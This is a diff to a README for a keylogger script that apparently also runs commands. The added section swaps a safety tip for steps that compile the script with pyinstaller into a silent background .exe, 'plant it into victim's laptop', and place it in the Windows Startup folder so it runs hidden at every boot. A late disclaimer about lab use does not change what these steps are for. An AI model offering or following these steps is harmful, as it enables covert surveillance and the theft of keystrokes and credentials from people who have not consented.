@@ -92,8 +92,31 @@ systeminfo
 
 ⚠️ All commands are executed with the same privileges as the user running the script. Be careful with destructive or administrative commands.
 
-## 🛑 Safety Tips
-- Do not run this script on shared, public, or unauthorized machines.
+## 🧪 EXE Compilation
+
+The real fun comes when you compile this code into .exe application and plant it into victim's laptop. 
+
+`pip install pyinstaller`
+
+Use the following command to bundle the script:
+
+`pyinstaller --onefile --noconsole Keylogger.py`
+
+- --onefile: bundles everything into a single .exe
+
+- --noconsole: runs silently in background (no terminal window)
+
+The .exe file will appear in the dist/ directory.
+
+You can place the .exe in the Startup folder, this way it start automatically everytime victim starts their computer.
+
+- open Windows + R and type `shell:startup`. This opens up startup application folder. Move the executbale file here and you're done. It will keep doing its work in background.
+
+##  ⚠️ Important Warning and  Safety tips
+
+- This executable is for personal lab use only.
+
+- Do not install or deploy this on any machine that you do not fully own or have explicit written consent to test.
 
 - Do not distribute this code without including this README and disclaimer.
 
